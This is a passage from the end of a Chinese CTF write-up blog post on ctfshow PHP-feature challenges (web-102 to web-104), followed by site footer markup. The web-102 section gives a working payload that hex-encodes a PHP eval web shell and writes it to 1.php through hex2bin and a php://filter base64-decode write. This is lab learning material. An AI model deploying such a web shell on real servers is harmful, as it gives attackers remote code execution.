+$c=bin2hex($b);      //这里直接用去掉=的base64
+//输出   5044383959474e6864434171594473
+带e会被当做科学计数法，而base64去掉等号，不影响解码
+bin2hex把ascii码转为16进制
+
+payload：
+php5中is_numeric函数认识16进制数，而php7这个函数不识别16进制数，
+hex2bin将16进制转换为ascii码，&lt;?php eval($_POST[1]);?&gt;的16进制编码为
+
+0x3c3f706870206576616c28245f504f53545b315d293b3f3e
+php5:
+v2=0x3c3f706870206576616c28245f504f53545b315d293b3f3e&amp;v3=1.php
+post:v1=hex2bin
+之后访问1.php
+
+php7:
+v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php 
+post: v1=hex2bin
+需要随便填充一些数字，从第二个字符开始截取的(也就是第三个，是从0开始的)
+之后访问1.php
+
+</code></pre><button class="code-block-unfold-btn"></button></div><hr><h3 id="web-103" tabindex="-1">web-103 <a class="header-anchor" href="#web-103" aria-label="Permalink to &quot;web-103&quot;">​</a></h3><p>跟上题做法一模一样</p><hr><h3 id="web-104" tabindex="-1">web-104 <a class="header-anchor" href="#web-104" aria-label="Permalink to &quot;web-104&quot;">​</a></h3><p>直接输入两个相同的值</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?v2=1
+v1=1
+</code></pre><button class="code-block-unfold-btn"></button></div><h3 id="" tabindex="-1"><a class="header-anchor" href="#" aria-label="Permalink to &quot;&quot;">​</a></h3><!--]--><!--]--><!----><!----></article><!--]--><!--[--><!--[--><!--[--><!----><ul class="post-copyright" m="y-4"><li class="post-copyright-author"><strong>本文作者：</strong><span>北歌</span></li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://kinsey973.github.io/posts/ctfshow-php%25E7%2589%25B9%25E6%2580%25A7" target="_blank" title="本文链接">https://kinsey973.github.io/posts/ctfshow-php%E7%89%B9%E6%80%A7</a></li><li class="post-copyright-license"><strong>版权声明：</strong><span>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 ">CC BY-NC-SA</a> 许可协议。</span></li></ul><!--]--><!--]--><!--]--></div><!--]--></div><!----></div><!--[--><!--]--><!--[--><div class="post-nav"><div class="post-nav-item"><a href="/posts/ctfshow-%25E4%25BF%25A1%25E6%2581%25AF%25E6%2590%259C%25E9%259B%2586" class="post-nav-prev" title="ctfshow 信息搜集"><div class="icon" i-ri-arrow-left-s-line></div><span class="title truncate" text="sm">ctfshow 信息搜集</span></a></div><div class="post-nav-item"><a href="/posts/php%25E7%2589%25B9%25E6%2580%25A7" class="post-nav-next" title="php特性"><span class="title truncate" text="sm">php特性</span><div class="icon" i-ri-arrow-right-s-line></div></a></div></div><!--]--><!--[--><!--]--><!--[--><div class="yun-card flex-center rounded-2 overflow-hidden comment yun-comment sm:p-6 lg:px-12 xl:px-16" flex="col" min-h="100px" bg="$va-c-bg-light" w="full" p="4"><!----><!----><div class="yun-card-body relative" w="full" flex="~ col" items="center"><!--[--><!----><!--]--></div><!----></div><!--]--><template class="mt-4 lg:hidden"></template><!--[--><!--]--><!--[--><!--]--></div><!--]--></main><!--[--><button class="xl:hidden toc-btn shadow-md fixed yun-icon-btn z-20 bg-$va-c-bg-soft" opacity="75" right="4" bottom="19"><div i-ri-file-list-line></div></button><!----><aside flex="~ col" class="va-card yun-aside min-h-sm rounded-2" text="center" overflow="auto"><div class="w-full" flex="~ col" pb-2><!--[--><h2 m="t-6 b-2" font="serif black">文章目录</h2><div style="display:none;" data-v-d9db7c40><div class="content" data-v-d9db7c40><div class="outline-title" data-v-d9db7c40>本页</div><div class="outline-marker" data-v-d9db7c40></div><nav aria-labelledby="doc-outline-aria-label" data-v-d9db7c40><span id="doc-outline-aria-label" class="visually-hidden" data-v-d9db7c40> Table of Contents for current page </span><ul class="root va-toc relative z-1 css-i18n-toc" data-v-d9db7c40 data-v-0a3661f1><!--[--><!--]--></ul></nav></div></div><!--]--><div class="flex-grow"></div><!----></div></aside><!--]--><!--]--></div><footer flex="~ col" class="relative yun-footer va-footer px-4 py-4 pt-0 text-$va-c-text-light w-full mt-14" bg="white dark:$va-c-bg-soft" text="center sm"><div class="yun-cloud absolute top--10 left-0 right-0"><svg class="waves" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" fill="var(--yun-c-cloud)"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><!----><div class="copyright flex justify-center items-center gap-2" p="1"><span> © <!--[-->2023 - <!--]--> 2026</span><a class="animate-pulse inline-flex" href="https://www.yunyoujun.cn/sponsors/" target="_blank" title="Sponsor YunYouJun"><div class="i-ri-cloud-line"></div></a><span>北歌</span></div><div class="powered" m="2"><span>由 <a href="https://github.com/YunYouJun/valaxy.git" target="_blank" rel="noopener">Valaxy</a> <span class="op-60">v0.28.7</span> 驱动</span><span mx-1>|</span><span><span>主题</span><span mx-1>-</span><a href="https://github.com/YunYouJun/valaxy/tree/main/packages/valaxy-theme-yun.git" title="valaxy-theme-yun" target="_blank">Yun</a><span class="ml-1 op-60">v0.28.7</span></span></div><!--[--><div>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次</div><div>本站访客数 <span id="busuanzi_value_site_uv"></span> 人次</div><!--]--><div class="yun-footer-gradient"></div></footer></div><!--]--></div><script>window.__INITIAL_STATE__='{"pinia":{"yun-app":{"bannerAnimationDone":false},"app":{"showLoading":true},"site":{},"routerStore":{}}}'</script><script type="application/ld+json" data-hid="schema-org-graph">{"@context":"https://schema.org","@graph":[{"@id":"https://kinsey973.github.io/#identity","@type":"Person","name":"北歌","url":"https://kinsey973.github.io/","image":{"@id":"https://kinsey973.github.io/#/schema/image/1"},"sameAs":["/atom.xml","https://music.163.com/#/user/home?id=3954596483","https://qm.qq.com/cgi-bin/qm/qr?k=kZJzggTTCf4SpvEQ8lXWoi5ZjhAx0ILZ&jump_from=webapi","https://github.com/kinsey973","https://travellings.link"]},{"@id":"https://kinsey973.github.io/#website","@type":"WebSite","dateModified":"2024-10-08T20:08:38.000Z","datePublished":"2024-10-08T20:08:38.000Z","inLanguage":"zh-CN","name":"ctfshow php特性","url":"https://kinsey973.github.io/","publisher":{"@id":"https://kinsey973.github.io/#identity"}},{"@id":"https://kinsey973.github.io/#webpage","@type":"WebPage","dateModified":"2024-10-08T20:08:38.000Z","datePublished":"2024-10-08T20:08:38.000Z","description":"山行野宿，孤身万里","name":"ctfshow php特性","url":"https://kinsey973.github.io/","about":{"@id":"https://kinsey973.github.io/#identity"},"isPartOf":{"@id":"https://kinsey973.github.io/#website"},"potentialAction":[{"@type":"ReadAction","target":["https://kinsey973.github.io/"]}]},{"@id":"https://kinsey973.github.io/#article","dateModified":"2024-10-08T20:08:38.000Z","datePublished":"2024-10-08T20:08:38.000Z","description":"山行野宿，孤身万里","headline":"ctfshow php特性","inLanguage":"zh-CN","thumbnailUrl":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091526769.png","@type":["Article","BlogPosting"],"author":{"@id":"https://kinsey973.github.io/#/schema/person/1"},"image":{"@id":"https://kinsey973.github.io/#/schema/image/2"},"isPartOf":{"@id":"https://kinsey973.github.io/#webpage"},"mainEntityOfPage":{"@id":"https://kinsey973.github.io/#webpage"},"publisher":{"@id":"https://kinsey973.github.io/#identity"}},{"@id":"https://kinsey973.github.io/#/schema/person/1","@type":"Person","name":"北歌","url":"https://valaxy.site"},{"@id":"https://kinsey973.github.io/#/schema/image/1","@type":"ImageObject","contentUrl":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410261321057.png","inLanguage":"zh-CN","url":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410261321057.png"},{"@id":"https://kinsey973.github.io/#/schema/image/2","@type":"ImageObject","contentUrl":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091526769.png","inLanguage":"zh-CN","url":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091526769.png"}]}</script>
+  
+</body>
+</html>
